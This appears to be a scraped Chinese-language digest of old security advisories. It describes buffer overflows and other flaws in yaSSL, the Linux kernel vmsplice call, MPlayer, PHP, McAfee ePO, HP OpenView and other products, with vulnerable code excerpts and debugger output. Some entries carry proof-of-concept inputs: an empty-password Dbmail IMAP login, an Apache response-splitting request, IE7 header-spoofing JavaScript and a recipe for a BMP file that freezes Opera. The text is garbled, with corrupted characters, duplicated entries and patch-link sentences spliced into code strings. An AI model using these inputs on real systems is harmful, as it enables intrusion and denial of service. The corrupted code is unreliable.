ProcessOldClientHello缓冲区溢?-------------------------------------------用于包含客户端所接收的Hello报文中的数据的缓冲区结构如下(源自yassl_imp.hpp)?class ClientHello : public HandShakeBase {    ProtocolVersion     client_version_;    Random              random_;    uint8               id_len_;                         // session id length    opaque              session_id_[ID_LEN];    uint16              suite_len_;                      // cipher suite length    opaque              cipher_suites_[MAX_SUITE_SZ];    uint8               comp_len_;                       // compression length    CompressionMethod   compression_methods_;    ...这里ID_LEN长度?2个单元，MAX_SUITE_SZ?4，RAN_LEN (Random)?2。如果接收到了旧版的Hello报文的话，所调用的ProcessOldClientHello函数没有执行必要的检查来限制填充上述3个字段的数据数量，导致缓冲区溢出漏洞?以下是handshake.cpp中的漏洞代码?void ProcessOldClientHello(input_buffer& input, SSL& ssl)    ...    ClientHello ch;    ...    for (uint16 i = 0; i < ch.suite_len_; i += 3) {            byte first = input[AUTO];        if (first)  // sslv2 type            input.read(len, SUITE_LEN); // skip        else {            input.read(&ch.cipher_suites_[j], SUITE_LEN);            j += SUITE_LEN;        }    }    ch.suite_len_ = j;    if (ch.id_len_)        input.read(ch.session_id_, ch.id_len_);    if (randomLen < RAN_LEN)        memset(ch.random_, 0, RAN_LEN - randomLen);    input.read(&ch.random_[RAN_LEN - randomLen], randomLen);    ...------------------------------------------------B] input_buffer& operator>>缓冲区溢?------------------------------------------------用于处理Hello报文的函数中存在另一个缓冲区溢出，但基本不太可能利用这个溢出执行代码。以下是yassl_imp.cpp中的漏洞代码?input_buffer& operator>>(input_buffer& input, ClientHello& hello)    ...    hello.id_len_ = input[AUTO];    if (hello.id_len_) input.read(hello.session_id_, ID_LEN);    // Suites    byte tmp[2];    tmp[0] = input[AUTO];    tmp[1] = input[AUTO];    ato16(tmp, hello.suite_len_);    input.read(hello.cipher_suites_, hello.suite_len_);    ...-----------------------------------------------------C] HASHwithTransform::Update无效内存访问-----------------------------------------------------在Hello报文中使用了过大的大小值会由于越界读取内存而导致函数库崩溃。以下是hash.cpp中的漏洞代码?void HASHwithTransform::Update(const byte* data, word32 len){    // do block size increment    word32 blockSz = getBlockSize();    byte*  local   = reinterpret_cast<byte*>(buffer_);    while (len) {        word32 add = min(len, blockSz - buffLen_);        memcpy(&local[buffLen_], data, add);        ...       Opera是一款流行的WEB浏览器，支持多种平台?Opera在处理畸形的BMP文件时存在漏洞，可能导致系统一定时间的性能大幅下降?BMP文件允许游程长度编码4位和8位的位图。BMP格式中所使用的RLE有一些额外的功能，如移动到其他行和列的写指针(00 02 XX YY)。Opera实现00 02 XX YY功能的算法过于缓慢，正常解压算法是将XX和YY * width添加到写指针，而Opera的实现要执行XX + YY * width递增，每次递增都要执行自己的检查和其他计算?攻击者可以创建最大宽??2000像素)的BMP文件，用00 02 FF FF opcode填充文件的数据。如果用户使用Opera打开了这个BMP文件的话，就会导致浏览器僵死一段时间，在较快的计算机上约为4分钟；如果创建的网页包含有多个图?<img>标签)的话，就可以导致浏览器僵死N * 单次僵死时间(N为图形数??      SDL_Image是用于处理图形文件的开源函数库。SDL_Image在处理畸形格式的图形文件时存在漏洞，远程攻击者可能利用此漏洞通过诱使用户处理恶意文件控制用户系统。SDL_Image库没有正确地处理Table Based Image Data头中带有无效LWZ Minimum Code Size的图形文件。标准允许代码的最大大小为12位，但SDL_image没有执行检查，因此可能触发缓冲区溢出。以下是IMG_gif.c文件的ReadImage函数中的漏洞代码?..unsigned char c;...if (LWZReadByte(src, TRUE, c) < 0) {RWSetMsg(\"error reading image\");    return NULL;   }    /*    **    If this is an \"uninteresting picture\" ignore it.     */    if (ignore) {    while (LWZReadByte(src, FALSE, c) >= 0)        ;    return NULL;    }...请注意c值未经任何检查便传送给了LZWReadByte。然后在LWZReadByte函数中可能会触发栈溢出：LWZReadByte(SDL_RWops *src, int flag, int input_code_size)...static int table[2][(1 << MAX_LWZ_BITS)];...set_code_size = input_code_size;...clear_code = 1 << set_code_size;...for (i = 0; i < clear_code; ++i) {table[0][i] = 0;table[1][i] = i;}...       Dbmail是一个程序集，允许从数据库检索和存储邮件，可使用MySQL、PostgreSQL和SQLite作为数据库后端?Dbmail的认证过程存在安全漏洞，如果启用了authldap模块且LDAP服务器允许匿名登录，则任何用户都可以使用空口令字符串登录到任意帐号?h000 ~ # telnet localhost 143Trying 127.0.0.1...Connected to localhost.Escape character is &#039;^]&#039;.* OK dbmail imap (protocol version 4r1) server 2.2 ready to runa login [EMAIL PROTECTED] \"\"a OK LOGIN completeda logout* BYE dbmail imap server kisses you goodbyea OK completedConnection closed by foreign host.漏洞的起因是ldap_bind_s函数?int ldap_bind_s(LDAP *ld, const char *who, const char *cred,int method);如果cred参数为\"\"的话，ldap库就会试图认证为匿名，bind返回成功，因此dbmail就允许用户进入到邮箱?modules/authldap.c:1263if (ldap_err) {TRACE(TRACE_ERROR, \"ldap_bind_s failed: 目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：dbmail dbmail 2.2.5 dbmail dbmail-2.2.9.tar.gz<a href=\"http://www.dbmail.org/download/2.2/dbmail-2.2.9.tar.gz\" target=\"_blank\" rel=\"nofollow\">http://www.dbmail.org/download/2.2/dbmail-2.2.9.tar.gz</a>dbmail dbmail 2.2.6 dbmail dbmail-2.2.9.tar.gz<a href=\"http://www.dbmail.org/download/2.2/dbmail-2.2.9.tar.gz\" target=\"_blank\" rel=\"nofollow\">http://www.dbmail.org/download/2.2/dbmail-2.2.9.tar.gz</a>dbmail dbmail 2.2.7 dbmail dbmail-2.2.9.tar.gz<a href=\"http://www.dbmail.org/download/2.2/dbmail-2.2.9.tar.gz\" target=\"_blank\" rel=\"nofollow\">http://www.dbmail.org/download/2.2/dbmail-2.2.9.tar.gz</a>dbmail dbmail 2.2.8 dbmail dbmail-2.2.9.tar.gz<a href=\"http://www.dbmail.org/download/2.2/dbmail-2.2.9.tar.gz\" target=\"_blank\" rel=\"nofollow\">http://www.dbmail.org/download/2.2/dbmail-2.2.9.tar.gz</a>\",ldap_err2string(ldap_err));*user_idnr = 0;} else {db_user_log_login(*user_idnr);}       Linux Kernel是开放源码操作系统Linux所使用的内核。Linux Kernel的实现上存在漏洞，本地攻击者可能利用此漏洞提升自己的权限。Linux Kernel的fs/splice.c文件中的vmsplice_to_user()函数错误地引用了用户提供的内存指?---8<--- fs/splice.c:1378 ---8<---error = get_user(base, &iov->iov_base);/* ... */if (unlikely(!base)) {error = -EFAULT;break;}/* ... */sd.u.userptr = base;/* ... */size = __splice_from_pipe(pipe, &sd, pipe_to_user);---8<--- fs/splice.c:1401 ---8<---这段代码没有验证这些指针。__splice_from_pipe()假设这些指针为有效的用户内存指针，没有执行任何验证。函数用pipe_to_user()中的__copy_to_user_inatomic()函数引用了指针，以便将数据写入用户进程内存，导致可能将从管道读取的任意数据写入到内核内存。本地攻击者可以通过特制的vmsplice()系统调用导致获得root用户权限?      Linux Kernel是开放源码操作系统Linux所使用的内核。Linux Kernel的实现上存在漏洞，本地攻击者可能利用此漏洞获取内核内存的敏感信息。Linux Kernel的fs/splice.c文件中的copy_from_user_mmap_sem()函数未经验证用户提供的指针便使用__copy_from_user_inatomic()拷贝了用户进程内存中的数据：---8<--- fs/splice.c:1188 ---8<---partial = __copy_from_user_inatomic(dst, src, n);---8<--- fs/splice.c:1188 ---8<---这可能允许本地攻击者通过特制的vmsplice()系统调用读取任意内核内存?   <   HP OpenView网络节点管理?OV NNM)是HP公司开发和维护的网络管理系统软件，具有强大的网络节点管理功能?OV NNM的多个服务和组件中存在目录遍历和拒绝服务漏洞，允许远程攻击者通过提交恶意请求导致服务崩溃或下载任意文件?---------------------------A] CGI目录遍历---------------------------NNM中的CGI使用一些指令过滤掉客户端传送参数中的恶意字符，但这些CGI所过滤掉的路径分隔符为反斜线，因此攻击者可以使用斜线执行目录遍历攻击，从磁盘上下载文件?----------------------------------B] ovalarmsrv拒绝服务----------------------------------如果向监听于2954端口的ovalarmsrv服务发送了不完整的多行请求的话，就会耗尽100%的CPU资源，无法再处理2953?954端口上的资源?25?5?6?7?1请求的最后数字参数用于指定每行中将要发送多少子参数。ovalarmsrv会启动一个循环，在接受到所有子参数后终止这个循环，如果关闭连接或不发送全部或部分上述参数就会导致整个服务僵死。以下为所有支持的请求及其sscanf格式?  REQUEST_CONTRIB_EVENTS  (22): \"%d %d 目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：HP OpenView Network Node Manager 7.53HP NNM_01193Windows<a href=\"http://support.openview.hp.com/selfsolve/patches\" target=\"_blank\" rel=\"nofollow\">http://support.openview.hp.com/selfsolve/patches</a>HP OpenView Network Node Manager 7.01HP NNM_01194Windows<a href=\"http://support.openview.hp.com/selfsolve/patches\" target=\"_blank\" rel=\"nofollow\">http://support.openview.hp.com/selfsolve/patches</a>\"  REQUEST_PRINT           (25): \"%d %d %d %d \"  REQUEST_DETAILS         (33): \"%d %d \"  REQUEST_EVENT_DELETE    (35): \"%d %d \"  REQUEST_EVENT_ACK       (36): \"%d %d \"  REQUEST_RUN_ACTION      (37): \"%d %d  \"  REQUEST_SPECDATA        (41):  REQUEST_EVENT_UNACK     (44): \"%d %d \"  REQUEST_SAVE            (45): \"%d %d %d %d \"  REQUEST_CAT_CHANGE      (46): \"%d %d %d %[^\n]\"  REQUEST_SEV_CHANGE      (47): \"%d %d %d %[^\n]\"  REQUEST_CONF_ACTIONS    (48): \"%d %d\n\"  REQUEST_RESTORE_STATE   (62): \"%d %[^\n]\"  REQUEST_SAVE_DIR        (63):  REQUEST_LOCALE          (66): \"%d\"  REQUEST_FORMAT_PRINT    (81): \"%d %d %d %d \"  REQUEST_CONF_RUN_ACTION (??): \"%d %d %d %[^\n]\"-----------------------------C] ovalarmsrv空指针引?-----------------------------上文所述的用于指定子参数数量的参数也用于分配一定数量的初始动态内?参数?* 2)以存储所有的子参数，如果指定了过大的无法分配的子参数数量就会触发空指针引用，导致服务崩溃?---------------------------------D] ovtopmd进程终止---------------------------------监听?532端口上的ovtopmd服务使用特定类型的报?0x36)来强制终止进?Exiting due to request of ovtopmd -k.)，因此攻击者可以使用这种报文导致拒绝服务?      White_Dune是VRML97文件的开源编辑器和查看器?White_Dune的实现上存在多个安全漏洞，远程攻击者可能利用此漏洞控制用户系统?-----------------------------------Scene::errorf缓冲区溢?-----------------------------------用于创建解析WRL文件中所出现问题的错误消息的函数中存在缓冲区溢出漏洞。以下是Scene.cpp文件中的漏洞代码?voidScene::errorf(const char *fmt, ...){    va_list ap;    char buf[1024], buf2[1024];    const char *url = \"\";      va_start(ap, fmt);    vsprintf(buf, fmt, ap);    if (TheApp->getImportURL() != NULL)        url = TheApp->getImportURL();    mysnprintf(buf2, 1024, \"目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：White_Dune White_Dune 0.29beta791White_Dune white_dune-0.29beta795.tar.gz <a href=\"http://129.69.35.12/dune/white_dune-0.29beta795.tar.gz\" target=\"_blank\" rel=\"nofollow\">http://129.69.35.12/dune/white_dune-0.29beta795.tar.gz</a> %d: \", url, lineno, buf);    _compileErrors += buf2;}------------------------------       Linux Kernel是开放源码操作系统Linux所使用的内核。Linux Kernel的实现上存在漏洞，本地攻击者可能利用此漏洞提升自己的权限。Linux Kernel的fs/splice.c文件中的vmsplice_to_user()函数错误地引用了用户提供的内存指?---8<;--- fs/splice.c:1378 ---8<---error = get_user(base, &iov->iov_base);/* ... */if (unlikely(!base)) {error = -EFAULT;break;}/* ... */sd.u.userptr = base;/* ... */size = __splice_from_pipe(pipe, &sd, pipe_to_user);---8<--- fs/splice.c:1401 ---8<---这段代码没有验证这些指针。__splice_from_pipe()假设这些指针为有效的用户内存指针，没有执行任何验证。函数用pipe_to_user()中的__copy_to_user_inatomic()函数引用了指针，以便将数据写入用户进程内存，导致可能将从管道读取的任意数据写入到内核内存。本地攻击者可以通过特制的vmsplice()系统调用导致获得root用户权限?      Boost库是一个可移植、提供源代码的C++库?Boost库处理正则表达式时basic_regex_creator.hpp:1224的get_repeat_type()函数中存在空指针引用错误，远程攻击者可能利用此漏洞导致采用了Boost库的应用程序崩溃?                                                                        具体如下?  if (state->next.p->next.p->next.p == static_cast<re_alt*>(state)->alt.p)远程攻击者可以通过向Boost提交恶意的正则表达式请求触发这些漏洞，导致拒绝服务?      yaSSL是用于实现SSL的开源软件包。yaSSL实现上存在多个远程溢出及无效内存访问问题，远程攻击者可能利用此漏洞控制服务器?------------------------------------------A] ProcessOldClientHello缓冲区溢?------------------------------------------用于包含客户端所接收的Hello报文中的数据的缓冲区结构如下(源自yassl_imp.hpp)：class ClientHello : public HandShakeBase {    ProtocolVersion     client_version_;    Random              random_;    uint8               id_len_;                         // session id length    opaque              session_id_[ID_LEN];    uint16              suite_len_;                      // cipher suite length    opaque              cipher_suites_[MAX_SUITE_SZ];    uint8               comp_len_;                       // compression length    CompressionMethod   compression_methods_;    ...这里ID_LEN长度?2个单元，MAX_SUITE_SZ?4，RAN_LEN (Random)?2。如果接收到了旧版的Hello报文的话，所调用的ProcessOldClientHello函数没有执行必要的检查来限制填充上述3个字段的数据数量，导致缓冲区溢出漏洞。以下是handshake.cpp中的漏洞代码：void ProcessOldClientHello(input_buffer& input, SSL& ssl)    ...    ClientHello ch;    ...    for (uint16 i = 0; i < ch.suite_len_; i += 3) {            byte first = input[AUTO];        if (first)  // sslv2 type            input.read(len, SUITE_LEN); // skip        else {            input.read(&ch.cipher_suites_[j], SUITE_LEN);            j += SUITE_LEN;        }    }    ch.suite_len_ = j;    if (ch.id_len_)        input.read(ch.session_id_, ch.id_len_);    if (randomLen < RAN_LEN)        memset(ch.random_, 0, RAN_LEN - randomLen);    input.read(&ch.random_[RAN_LEN - randomLen], randomLen);    ...------------------------------------------------B] input_buffer& operator>>缓冲区溢?-----------------------------------------------用于处理Hello报文的函数中存在另一个缓冲区溢出，但基本不太可能利用这个溢出执行代码。以下是yassl_imp.cpp中的漏洞代码：input_buffer& operator>>(input_buffer& input, ClientHello& hello)    ...    hello.id_len_ = input[AUTO];    if (hello.id_len_) input.read(hello.session_id_, ID_LEN);    // Suites    byte tmp[2];    tmp[0] = input[AUTO];    tmp[1] = input[AUTO];    ato16(tmp, hello.suite_len_);    input.read(hello.cipher_suites_, hello.suite_len_);    ...-----------------------------------------------------C] HASHwithTransform::Update无效内存访问-----------------------------------------------------在Hello报文中使用了过大的大小值会由于越界读取内存而导致函数库崩溃。以下是hash.cpp中的漏洞代码：void HASHwithTransform::Update(const byte* data, word32 len){    // do block size increments    word32 blockSz = getBlockSize();    byte*  local   = reinterpret_cast<byte*>(buffer_);    while (len) {        word32 add = min(len, blockSz - buffLen_);        memcpy(&local[buffLen_], data, add);        ...       Apache HTTP Server是一款流行的Web服务器?如果可以设置类似于以下的文件名，就可以使用类似的技术触发HTTP响应拆分?&#039;junkHeader: Injectedblah:.jpg&#039;然后请求URLencode编码的文件名?------------------------------------------------------GET /junk%0aHeader:%20Injected%0ablah: HTTP/1.1Host: 127.0.0.1Accept: image/jpeg; q=0HTTP/1.1 406 Not AcceptableDate: Tue, 15 Jan 2008 16:06:52 GMTServer: Apache/2.0.55 (Ubuntu) PHP/5.1.6Alternates: {\"junkHeader: Injected                             <----- Here!blah:.jpg\" 1 {type image/jpeg} {length 2}}Vary: negotiateTCN: listContent-Length: 508Content-Type: text/HTML; charset=iso-8859-1<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><HTML><head><title>406 Not Acceptable</title></head><body><h1>Not Acceptable</h1>   MPlayer是一款基于Linux的媒体播放程序，支持多种媒体格式。MPlayer的libmpdemux/demux_audio.c文件在解析FLAC标注时存在栈溢出漏洞?-----------libmpdemux/demux_audio.c206 case FLAC_VORBIS_COMMENT:207     {208        /* For a description of the format please have a look at */209        /* HTTP://www.xiph.org/vorbis/doc/v-comment.HTML */210211        uint32_t length, comment_list_len;212 (1)    char comments[blk_len];213        uint8_t *ptr = comments;214        char *comment;215        int cn;216        char c;217218        if (stream_read (s, comments, blk_len) == blk_len)219        {220 (2)       length = AV_RL32(ptr);221            ptr += 4 + length;222223            comment_list_len = AV_RL32(ptr);224            ptr += 4;225226            cn = 0;227            for (; cn < comment_list_len; cn++)228            {229               length = AV_RL32(ptr);230               ptr += 4;231232               comment = ptr;233 (3)           c = comment[length];234               comment[length] = 0;                            ...- -----------/可见?2)处length参数是从文件流中的位置加载的，然后未经任何验证便在comment缓冲区索引中使用，这可能触发栈溢出，导致执行任意代码?      MPlayer是一款基于Linux的媒体播放程序，支持多种媒体格式?MPlayer的libmpdemux/demux_audio.c文件在解析FLAC标注时存在栈溢出漏洞?/-----------libmpdemux/demux_audio.c206 case FLAC_VORBIS_COMMENT:207     {208        /* For a description of the format please have a look at */209        /* HTTP://www.xiph.org/vorbis/doc/v-comment.HTML */210211        uint32_t length, comment_list_len;212 (1)    char comments[blk_len];213        uint8_t *ptr = comments;214        char *comment;215        int cn;216        char c;217218        if (stream_read (s, comments, blk_len) == blk_len)219        {220 (2)       length = AV_RL32(ptr);221            ptr += 4 + length;222223            comment_list_len = AV_RL32(ptr);224            ptr += 4;225226            cn = 0;227            for (; cn < comment_list_len; cn++)228            {229               length = AV_RL32(ptr);230               ptr += 4;231232               comment = ptr;233 (3)           c = comment[length];234               comment[length] = 0;                            ...- -----------/可见?2)处length参数是从文件流中的位置加载的，然后未经任何验证便在comment缓冲区索引中使用，这可能触发栈溢出，导致执行任意代码?      Firefox是一款流行的开源WEB浏览器。FMozilla Firefox浏览器引?2.0.0.12之前版本，SeaMonkey 1.1.8 之前版本，Firefox会对<LINK REL=\"\"stylesheet\"\" HREF=\"\"...\"\">请求跟随302重新定向，然后允许通过访问element.sheet.href属性访问目标URL，这可能导致泄露敏感URL参数?      Mozilla Firefox <div> 页面伪造漏?   Firefox是一款流行的开源WEB浏览器。FMozilla Firefox浏览器引?2.0.0.12之前版本，如果整个网页的内容都用绝对定位包装在了<div>中，则除非用户将标签页从伪造页面切换走然后又切换回来，否则不会显示WEB伪造警告对话框?      Double-Take以HP StorageWorks Storage 镜像名字和其他名字进行分区，存在多个拒绝服务漏洞。远程攻击者可以借助(1)一个大的向?T>?它会引起一个\"向量<T>过长\"的意外；?2)一个会引起ospace/time/src\date.cpp意外的特定的信息包导致拒绝服务攻?后台程序中止)?      Double-Take 向量<T>?拒绝服务攻击漏洞   Double-Take以HP StorageWorks Storage 镜像名字和其他名字进行分区，存在拒绝服务漏洞。远程攻击者借助能够详细说明向量<T>值的大小的字段中的一?1值引起拒绝服务攻?CPU耗竭)?      SurgeMail是下一代的邮件服务器，可运行在Windows NT/2K或UNIX平台上，支持所有的标准IMAP、POP3、SMTP、SSL和ESMTP协议。SurgeMail中用于处理webmail接口(webmail.exe)的CGI存在安全漏洞，远程攻击者可能利用此漏洞控制服务器。CGI中用于在请求错误页面时构建错误消息的函数未经验证格式参数便直接将其传送给了lvprintf：\"TPL: Failed to Locate Template {c:\surgemail\webmail\panel\目前厂商还没有提供补丁或者升级程序，建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://netwinsite.com/\" target=\"_blank\" rel=\"nofollow\">http://netwinsite.com/</a>.tpl}{2=No such file or directory}\"这允许远程攻击者通过提交恶意请求执行格式串攻击?      Microsoft Jet数据库是MS Office应用程序中广泛使用的轻型数据库?Jet数据库在处理畸形MDB文件时存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞通过诱使用户处理恶意文件，控制服务器?Office Access在解析MDB文件时会调用Jet数据库引?msjet40.dll)，如果解析了恶意的MDB文件就会在以下代码中触发栈溢出：C:\Windows\System32\msjet40.dll，版本为4.0.8618.0    .text:1B0B72BB                 mov     ecx, edx        ; ecx=0x5200    .text:1B0B72BD                 mov     esi, edi        ; esi pointto the datas    .text:1B0B72BF                 mov     ebp, ecx           ; whichcan be find in the mdb file    .text:1B0B72C1                 lea     edi, [esp+40h]  ; edi pointto stack memory    .text:1B0B72C5                 shr     ecx, 2    .text:1B0B72C8                 rep movsd               ; stack overflow!!    .text:1B0B72CA                 mov     ecx, ebp    .text:1B0B72CC                 mov     eax, [eax+1]    .text:1B0B72CF                 and     ecx, 3    .text:1B0B72D2                 rep movsb以下为调试信息：eax=05f5cb67 ebx=05e66458 ecx=00005200 edx=00005200 esi=05f5cd12edi=0013db60    eip=1b0b72c5 esp=0013db20 ebp=00005200 iopl=0         nv up ei plnz ac pe nc    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000efl=00000216    msjet40!Ordinal55+0x23cd8:    1b0b72c5 c1e902          shr     ecx,2    0:000> u eip    msjet40!Ordinal55+0x23cd8:    1b0b72c5 c1e902          shr     ecx,2    1b0b72c8 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]    1b0b72ca 8bcd            mov     ecx,ebp    1b0b72cc 8b4001          mov     eax,dword ptr [eax+1]    1b0b72cf 83e103          and     ecx,3    1b0b72d2 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]    1b0b72d4 8bb424d4000000  mov     esi,dword ptr [esp+0D4h]    1b0b72db 8b4b28          mov     ecx,dword ptr [ebx+28h]    0:000> db esi    05f5cd12  00 4f 00 53 00 7e 00 31-00 5c 00 56 00 42 00 41  .O.S.~.1.\.V.B.A    05f5cd22  00 5c 00 56 00 42 00 41-00 36 00 5c 00 56 00 42  .\.V.B.A.6.\.V.B    05f5cd32  00 45 00 36 00 2e 00 44-00 4c 00 4c 00 23 00 56  .E.6...D.L.L.#.V    05f5cd42  00 69 00 73 00 75 00 61-00 6c 00 20 00 42 00 61  .i.s.u.a.l. .B.a    05f5cd52  00 73 00 69 00 63 00 20-00 46 00 6f 00 72 00 20  .s.i.c. .F.o.r.    05f5cd62  00 41 00 70 00 70 00 6c-00 69 00 63 00 61 00 74  .A.p.p.l.i.c.a.t    05f5cd72  00 69 00 6f 00 6e 00 73-00 00 00 00 00 00 00 00  .i.o.n.s........    05f5cd82  00 00 00 00 00 12 01 2a-00 5c 00 47 00 7b 00 34  .......*.\.G.{.4    0:000> db edi    0013db60  09 00 00 00 01 00 00 00-18 00 00 00 9a 51 00 1b  .............Q..    0013db70  86 ce 00 1b 00 c0 f5 05-02 00 00 00 e8 dc 13 00  ................    0013db80  22 7c 00 1b 0c 11 f4 05-e8 dc 13 00 c0 10 f4 05  \"|..............    0013db90  3c cd 00 1b c0 10 f4 05-00 c0 f5 05 9c 78 e6 05  <............x..    0013dba0  e8 dc 13 00 05 10 92 7c-38 78 e6 05 eb cb 00 1b  .......|8x......    0013dbb0  80 9f a4 05 b0 98 a4 05-01 00 00 00 f2 cb 00 1b  ................    0013dbc0  9c 78 e6 05 e8 dc 13 00-4c dc 13 00 4c dc 13 00  .x......L...L...    0013dbd0  01 00 00 00 60 f3 00 1b-80 9f a4 05 02 00 00 00  ....`...........请注意由于这是Jet引擎中的漏洞，因此一些网络空间供应商也可能受影响。攻击者可以上?asp?mdb文件，并通过ADODB.Connection服务器对象利用这个漏洞?      KeyView是用于导出、转换和查看各种格式文件的软件包?kvdocve.dll在处理超长路径时存在缓冲区溢出，如果HTML文档<IMG>标签的src属性中存在超长链接的话就可能触发这个溢出?      PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中?PHP formatted_print.c文件?printf()函数存在整数溢出漏洞，能够执行PHP脚本的攻击者可能利用此漏洞提升权限?在formatted_print.c文件的php_sprintf_appendstring()函数中：- ---formatted_print.c-start---inline static voidphp_sprintf_appendstring(char **buffer, int *pos, int *size, char *add,                           int min_width, int max_width, char padding,                           int alignment, int len, int neg, int expprec, int always_sign)- ---formatted_print.c-end---主变量为npad?- ---formatted_print.c-start---    copy_len = (expprec ? MIN(max_width, len) : len);    npad = min_width - copy_len;- ---formatted_print.c-end---这里npad?147483646?- ---formatted_print.c-start---    req_size = *pos + MAX(min_width, copy_len) + 1;- ---formatted_print.c-end---    req_size overflow- ---formatted_print.c-start---    if (req_size > *size) {        while (req_size > *size) {            *size <<= 1;        }        PRINTF_DEBUG((\"sprintf ereallocing buffer to %d bytes\n\", *size));        *buffer = erealloc(*buffer, *size);    }- ---formatted_print.c-end---(req_size > *size)为False?alignment == ALIGN_RIGHT)为True，因?- ---formatted_print.c-start---        while (npad-- > 0) {            (*buffer)[(*pos)++] = padding;        }- ---formatted_print.c-end---gdb调试结果如下?- --- Debug ---0x08295ba5 in php_sprintf_appendstring (buffer=0xbfbfd318, pos=0xbfbfd31c,     size=0xbfbfd324, add=0x28f20404 &#039;A&#039; <repeats 200 times>...,     min_width=2147483646, max_width=0, padding=65 &#039;A&#039;, alignment=1, len=1,     neg=0, expprec=0, always_sign=0)...0x290fff0c:      &#039;A&#039; <repeats 200 times>...0x290fffd4:      &#039;A&#039; <repeats 44 times> <Error reading address 0x29100000: Bad \                address>0x29100000:      <Error reading address 0x29100000: Bad address>- --- Debug ---脚本会向内存分配大量数据，导致拒绝服务或执行任意指令?      BootManage TFTPD是联网PC管理工具BootManage Administrator中所实现的TFTP服务器?BootManage TFTPD服务器实现上存在缓冲区溢出漏洞，远程攻击者可能利用此漏洞控制服务器?如果向BootManage TFTPD发送了超过32字节的文件名的话，则在使用这个文件名创建日志字符串sprintf(buffer, &#039;目前厂商还没有提供补丁或者升级程序，建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://www.bootix.com/products/administrator_en.html\" target=\"_blank\" rel=\"nofollow\">http://www.bootix.com/products/administrator_en.html</a> : &#039;, filename, log_entry)的时候就可能触发栈溢出，导致执行任意指令?      McAfee ePolicy Orchestrator(ePO)是一种业界领先的系统安全管理解决方案，能够帮助企业有效抵御各种恶意威胁和攻击?ePO的SiteManager.Dll ActiveX控件中存在多个缓冲区溢出漏洞，允许远程攻击者完全控制受影响的系统?1. ExportSiteList()函数栈溢?InprocServer32?   SiteManager.dll    ClassID?    4124FDF6-B540-44C5-96B4-A380CEE9826A    ProgID?    SiteManager.SiteMgr.1   函数名：     ExportSiteList    如果将ExportSiteList参数设置为超长字符串，就会触发栈溢出，相关代码如下：    (SiteManager.dll,version=3.6.1.166)    .text:5262B1DE ; func_ExportSiteList    .text:5262B1DE ; Attributes: bp-based frame    .text:5262B1DE    .text:5262B1DE ; int __stdcall sub_5262B1DE(int,wchar_t *,int)    .text:5262B1DE sub_5262B1DE    proc near            ; DATA XREF: .rdata:5265B504 o    .text:5262B1DE                            ; .rdata:5265B614 o    .text:5262B1DE    .text:5262B1DE var_414         = word ptr -414h    .text:5262B1DE var_20E         = word ptr -20Eh    .text:5262B1DE var_20C         = word ptr -20Ch    .text:5262B1DE var_4           = dword ptr -4    .text:5262B1DE arg_0           = dword ptr  8    .text:5262B1DE arg_4           = dword ptr  0Ch    .text:5262B1DE arg_8           = dword ptr  10h    .text:5262B1DE    .text:5262B1DE                 push    ebp    .text:5262B1DF                 mov     ebp, esp    .text:5262B1E1                 sub     esp, 414h    .text:5262B1E7                 mov     eax, dword_52670218    ; set stack cookie    .text:5262B1EC                 push    esi    .text:5262B1ED                 push    [ebp+arg_4]        ; lpSrcBuff    .text:5262B1F0                 mov     [ebp+var_4], eax    .text:5262B1F3                 lea     eax, [ebp+var_20C]    .text:5262B1F9                 push    eax            ; lpDestBuff    .text:5262B1FA                 call    ds:wcscpy        ; stack overflow2. 以下swprintf函数未经验证便执行了拷贝操作?    .text:5262B257                 push    ebx    .text:5262B258                 push    edi    .text:5262B259                 mov     edi, offset aSitelist_xml ; \"SiteList.xml\"    .text:5262B25E                 push    edi    .text:5262B25F                 lea     eax, [ebp+var_20C]    .text:5262B265                 push    eax    .text:5262B266                 lea     eax, [ebp+var_414]    .text:5262B26C                 push    offset aSS_0        ; \"目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"https://mysupport.mcafee.com/eservice_enu/start.swe\" target=\"_blank\" rel=\"nofollow\">https://mysupport.mcafee.com/eservice_enu/start.swe</a> \\\"    .text:5262B271                 push    eax            ; lpSrcBuff    .text:5262B272                 call    ds:swprintf        ; stack overflow3. VerifyPackageCatalog()函数栈溢?   InprocServer32?   SiteManager.dll    ClassID?    4124FDF6-B540-44C5-96B4-A380CEE9826A    ProgID?    SiteManager.SiteMgr.1    函数名：     VerifyPackageCatalog    如果将VerifyPackageCatalog参数设置为超长字符串，就会触发栈溢出，相关代码如下：    (SiteManager.dll,version=3.6.1.166)    part1:    .text:5262CFAC func_VerifyPackageCatalog proc near        .text:5262CFAC                            .text:5262CFAC           mov     eax, offset loc_52649F86    .text:5262CFB1           call    __EH_prolog    ...    .text:5262D00C           lea     eax, [ebp-28h]    .text:5262D00F           push    eax    .text:5262D010           push    ebx    .text:5262D011           push    esi    .text:5262D012           push    offset loc_5263AD1A    .text:5262D017           push    ebx    .text:5262D018           push    ebx    .text:5262D019           call    ds:_beginthreadex    part2:    .text:5263AD1A           mov     eax, offset loc_5264B221    .text:5263AD1F           call    __EH_prolog    .text:52637229           push    ecx    .text:5263722A           mov     eax, 1774h    .text:5263722F           call    __alloca_probe                ; int    .text:52637234           mov     eax, dword_52670218    .text:52637239           mov     [ebp-14h], eax                ; set stack-cookie    ...    .text:5263AD9A           lea     ecx, [ebp-23Ch]    .text:5263ADA0        Internet Explorer是微软发布的非常流行的WEB浏览器。IE 7允许通过HTTP请求拆分攻击覆盖Content-Length、Host和Referer等HTTP头，导致HTTP头信息欺骗。类似于以下javascript?---------------------------------------------var x=new XMLHttpRequest();x.open(\"POST\",\"/\");for(f=127;f<255;f++)try{ x.setRequestHeader(\"Host\"+String.fromCharCode(f),\"Test\");}catch(dd){}x.setRequestHeader(\"Connection\",\"keep-alive\"); x.onreadystatechange=function (){    if (x.readyState == 4){   } }x.send(\"blah\");----------------------------------------------会覆盖以下头? Content-Length   x.setRequestHeader(\"Content-Length\"+String.fromCharCode(201),\"0\");   